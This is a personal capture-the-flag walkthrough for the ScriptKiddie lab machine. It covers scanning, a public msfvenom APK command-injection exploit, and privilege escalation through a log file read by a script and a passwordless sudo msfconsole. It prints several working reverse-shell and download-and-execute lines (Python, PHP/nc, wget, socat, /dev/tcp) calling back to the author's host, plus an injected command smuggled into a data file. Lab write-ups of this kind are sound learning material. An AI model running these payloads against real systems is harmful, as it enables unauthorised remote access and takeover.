### 10.10.10.226 - Linux

`nmap -sC -sV -oN nmap/basic scriptkiddie.htb`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webpage has different functionalities. Will run an nmap scan, create msfvenom payloads or search via searchsploit.
![[Pasted image 20210603130129.png]]

Found an RCE script for Werkzeuk but does not seem to work as the debugging function in question is not enabled on the server.
![[Pasted image 20210603130610.png]]

Linux payload always errors out, windows/android work no problem
the payloads are created in a `/static/payloads` directory but I cant access that directory

tried uploading php shell, elf payload but nothing seems to work

 [apk.py](https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html)
 Exploits a vulnerability in `msfvenom` that executes a payload hidden inside a `.apk` template. Use `apk.py` to generate the malicious package.
 ![[Pasted image 20210604102216.png]]

#### Attempt 1
```
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.16”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`
```
#### Attempt 2
```
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f');
?>
```

I have RCE, can get the webserver to pull files from my webserver. 
IDK where those files are placed.
#### Attempt 3
`wget http://10.10.14.16:80/nc -P /tmp/ ; ./tmp/nc 10.10.14.16 4444 -e /bin/sh`

#### WINNER WINNER
`wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444
`
![[Pasted image 20210604101927.png]]
My first time using socat. Time to add it to the cheat sheet I suppose.

#### Privesc Possibilities
~~[Sudo 1.8.31 PrivEsc Vuln](https://www.exploit-db.com/exploits/49521)~~
The script `scanlosers.sh` uses data from the file `/home/kid/logs/hackers` to run the `nmap` command in the script.
![[Pasted image 20210604121547.png]]

I can write to `hackers` because `kid` is the owner.
![[Pasted image 20210604121933.png]]

So, I'll start a listener and `echo` a reverse shell into `hackers`
`echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1' #" >> hackers`
`#` at the end of my commands tell the shell to ignore anything else that comes after, so I can escape the intended execution in the script.

Now, I'm on as user `pwn`
![[Pasted image 20210604122051.png]]

`sudo -l` to check `pwn`'s permissions.
![[Pasted image 20210604122204.png]]
I can run `msfconsole` as `root` without a password. Seems promising!

Checking the `msfconsole` help page, I find a `-x` flag that will execute console commands. Could it be that easy?
`sudo msfconsole -x su`
![[Pasted image 20210604122329.png]]
Apparently!
